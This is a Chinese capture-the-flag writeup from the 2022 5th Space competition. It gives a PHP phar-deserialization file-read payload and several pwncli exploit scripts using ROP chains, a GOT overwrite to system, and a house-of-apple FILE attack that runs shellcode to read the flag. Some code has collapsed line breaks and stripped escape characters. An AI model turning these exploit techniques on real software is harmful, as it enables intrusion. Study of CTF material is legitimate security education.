# 2022 第五空间网络安全初赛 writeup by Arr3stY0u

> 原文: https://www.ctfiot.com/57918.html
> ID: 57918

点击蓝字，关注我们吧！

Arr3stY0u头

这个比赛的web跟misc好搞人心态，希望出题人全家平安。另外这个safevm一直打不通远端，问了出题人才知道远端偏移量和本地不一样，时间不够了所以就没看，toolkit相对简单，但也是因为safevm浪费了太长时间所以比赛中没能做出来，非常可惜。不过exp会提供给大家复现，详细思路就不浪费时间写了。意淫一下我们ak了pwn哈哈哈哈。

招野生web师傅(大二及以下，考核通过可获书籍一本，书籍自选)。

招野生pwn师傅(大二及以下，考核通过可获pwncli作者roderick签名书籍一本，书籍自选)

招野生crypto师傅(大二及以下，数论/群论/格，最好会sage，考核通过可获书籍一本，书籍自选)

招野生SRC师傅(补天专属/企业SRC/众测，考核通过可获书籍一本，书籍自选)

招新&合作联系方式在文末；部分题目附件下载地址请后台回复：5ctf2022

MISC

简单的misc：

print(bytes.fromhex("666c61677b57656c636f6d655f686572657d"))

WEB

web_BaliYun：

file_exist(img_name)触发 phar 反序列化使任意文件读取www.zip 源码

运行 php 生成 phar，并改名成图片后缀，上传请求 index.php/?img_name=phar://upload/phar.png 触发，会输出 flag

<?phpclass upload{ public $filename; public $ext; public $size; public $Valid_ext; public function __construct($cmd){ $this->filename = $cmd; $this->ext = ".png"; $this->size = 1; $this->Valid_ext = array("gif", "jpeg", "jpg", "png"); } public function start(){ return $this->check(); } private function check(){ if(file_exists($this->filename)){ return "Image already exsists"; }elseif(!in_array($this->ext, $this->Valid_ext)){ return "Only Image Can Be Uploaded"; }else{ return $this->move(); } } private function move(){ move_uploaded_file($_FILES["file"]["tmp_name"], "upload/".$this->filename); return "Upload succsess!"; } public function __wakeup(){ echo file_get_contents($this->filename); } }$phar = new Phar('phar.phar');$phar -> stopBuffering();$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');$phar -> addFromString('test.txt','test');$payload = "/flag";$object = new upload($payload);$object -> output= 'phpinfo();';$phar -> setMetadata($object);$phar -> stopBuffering();

REVERSE

初步分析

binwalk -Me rootfs.img

def regs2mmptr(reg_idx, data1_idx, offset): build_data(0x32CD41, reg_idx, 0, (data1_idx << 32) | offset)

def assign_reg(idx, value): build_data(0x11FE22, idx, 0, value)

#!/usr/bin/env python3from pwncli import *cli_script()io = gift["io"]elf = gift["elf"]libc = gift.libcfilename = gift.filename # current filenameis_debug = gift.debug # is debug or not is_remote = gift.remote # is remote or notgdb_pid = gift.gdb_pid # gdb pid if debugif gift.remote: libc = ELF("./libc-2.23.so") gift["libc"] = libcCurrentGadgets.set_find_area(1,0)pd = flat( { 104:[ CurrentGadgets.write_by_magic(elf.bss(0x100),0,u32_ex('sh')), CurrentGadgets.write_by_magic(elf.got.puts,libc.sym.puts,libc.sym.system), CurrentGadgets.pop_rdi_ret(), elf.bss(0x100), CurrentGadgets.ret(), elf.plt.puts ] } )sl(pd)io.interactive()

```
#!/usr/bin/python3# -*- encoding: utf-8 -*-# author: roderick
from pwncli import *
cli_script()
io: tube = gift['io']elf: ELF = gift['elf']libc: ELF = gift['libc']
def build_data(a1, a2, a3, a4, data2=b""): data = b"xb9x80x04" data += b"x82" + p32_ex(a1) data += b"x82" + p32_ex(a2) data += b"x82" + p32_ex(a3) data += b"x87" + p64_ex(a4) sa("Input: ", p16(len(data)) + data + data2)
def assign(idx, data_idx): build_data(0xFFDEAD, 0x2222, 0, (idx << 4) | data_idx)
def puts_data(idx, data_idx): build_data(0xFFDEAD, 0x1111, 0, (idx << 32) | (data_idx * idx * 0x10))
# 构造单链表或者赋值list# list = &mmap_ptr[idx]; data[data_idx] = 0;def gets_data(idx, data_idx): build_data(0xFFDEAD, 0x3333, 0, (idx << 32) | (data_idx * idx * 0x10))
def gets_data2(idx, offset): build_data(0xFFDEAD, 0x3333, 0, (idx << 32) | offset)
def mmptr2regs(reg_idx, data1_idx, mmptr_idx): build_data(0x32CD42, reg_idx, 0, (data1_idx << 32) | (data1_idx * mmptr_idx * 0x10))
def regs2mmptr(reg_idx, data1_idx, offset): build_data(0x32CD41, reg_idx, 0, (data1_idx << 32) | offset)

def assign_reg(idx, value): build_data(0x11FE22, idx, 0, value)

assign(0x1, 0)assign(0x1, 0)assign(0x1, 0)gets_data(1, 0)

for i in range(0x40): assign(0x4, 0)
gets_data(0x4, 0)gets_data(0x4, 1)assign(0x4, 0)assign(0x4, 0)puts_data(4, 0)
libcaddr = u64(rn(8))log_address_ex("libcaddr")# !!!!!!!!!!!!!!# !!!!!!!!!!!!!!# 这个偏移需要猜测一下# 猜了一下午了，一般爆破1个字节足以offfff = 0x431040lbase = libcaddr - offffflog_libc_base_addr(lbase)libc.address = lbase
# stdin->chain写入libc地址assign_reg(1, u64(b"a" + p64_ex(libc.sym._IO_2_1_stdin_ + 0x68)[:7]))regs2mmptr(1, 4, 0xfff)
gets_data(1, 1)for i in range(0x30): assign(0x1, 0)
# house of apple执行ropfakeFILE_addr = offfff + 0xfd0 + lbase
assign_reg(1, libc.sym._IO_wfile_jumps)regs2mmptr(1, 1, 0x10 + 0xd8)
assign_reg(1, 1)regs2mmptr(1, 1, 0x10 + 0x28)
assign_reg(1, libcaddr)regs2mmptr(1, 1, 0x10 + 0x88) # lock

assign_reg(1, fakeFILE_addr)regs2mmptr(1, 1, 0x10 + 0xa0) # wide_data
assign_reg(1, fakeFILE_addr)regs2mmptr(1, 1, 0x10 + 0xe0) # wide_data->vtable
# 0x00000000000562ec: leave; ret; assign_reg(1, 0x00000000000562ec + lbase)regs2mmptr(1, 1, 0x10 + 0x68) # wide_data
# 0x000000000007e99a: add rsp, 0xe8; pop rbx; pop rbp; ret;assign_reg(1, 0x000000000007e99a + lbase)regs2mmptr(1, 1, 0x10 + 0x8) # wide_data
# 0x000000000002a3e5: pop rdi; ret; # 0x000000000002be51: pop rsi; ret; # 0x0000000000090529: pop rdx; pop rbx; ret;offset = 0x10 + 0x108assign_reg(1, 0x000000000002a3e5 + lbase)regs2mmptr(1, 1, offset) offset += 8assign_reg(1, fakeFILE_addr & ~0xfff)regs2mmptr(1, 1, offset)offset += 8assign_reg(1, 0x000000000002be51 + lbase)regs2mmptr(1, 1, offset) offset += 8assign_reg(1, 0x1000)regs2mmptr(1, 1, offset)offset += 8assign_reg(1, 0x0000000000090529 + lbase)regs2mmptr(1, 1, offset) offset += 8assign_reg(1, 7)regs2mmptr(1, 1, offset)offset += 8assign_reg(1, 7)regs2mmptr(1, 1, offset)offset += 8assign_reg(1, libc.sym.mprotect)regs2mmptr(1, 1, offset)offset += 8

assign_reg(1, 0x000000000002a3e5 + lbase)regs2mmptr(1, 1, offset) offset += 8assign_reg(1, 0)regs2mmptr(1, 1, offset)offset += 8assign_reg(1, 0x000000000002be51 + lbase)regs2mmptr(1, 1, offset) offset += 8assign_reg(1, fakeFILE_addr + 0x400)regs2mmptr(1, 1, offset)offset += 8assign_reg(1, 0x0000000000090529 + lbase)regs2mmptr(1, 1, offset) offset += 8assign_reg(1, 0x400)regs2mmptr(1, 1, offset)offset += 8assign_reg(1, 0x400)regs2mmptr(1, 1, offset)offset += 8assign_reg(1, libc.sym.read)regs2mmptr(1, 1, offset)offset += 8
assign_reg(1, fakeFILE_addr + 0x400)regs2mmptr(1, 1, offset)offset += 8
build_data(0xFFDEAD, 0x4444, 0, 0)
sleep(0.5)s(asm(shellcraft.cat2("flag", length=0x40)))
ia()
```

#!/usr/bin/env python3# Date: 2022-09-19 17:16:43# Author: roderick# Link: https://github.com/RoderickChan/pwncli# Usage: # Debug: python3 exp.py debug elf-file-path -t -b malloc# Remote: python3 exp.py remote elf-file-path ip:port
from pwncli import *cli_script()
io: tube = gift.ioelf: ELF = gift.elflibc: ELF = gift.libc
def cmd(i): sla("[+] ", str(i)) 
def tool1(): cmd(1) 
def tool2(i, sz, data): cmd(2) sla("[-] ", str(i)) sla("Length: ", str(sz)) sla("Content: ", data) sla("Key: ", "a"*8)

def secret(): cmd(3) 
def getgift(passwd): cmd(0xDEAD00) sla("Password: ", passwd)
getgift("a"*0x210)ru("a"*0x210)codebase = u64_ex(rn(6)) - 0x150aelf.address = codebase
log_address_ex("codebase")
CurrentGadgets.set_find_area(1, 0)
tool2(2, -1, flat({ 0: "/flagx00", 312-8: [ codebase + 0x56e0, codebase + 0x25e0, ], 360: [ CurrentGadgets.pop_rdi_ret(), codebase + 0x5060, CurrentGadgets.pop_rsi_r15_ret(), 0, 0, elf.plt.open, codebase + 0x292A, 0, 1, 3, codebase + 0x5260, 0x40, elf.got.read, codebase + 0x2910, "a"*0x38, CurrentGadgets.pop_rdi_ret(), codebase + 0x5260, elf.plt.puts ]}))
ia()
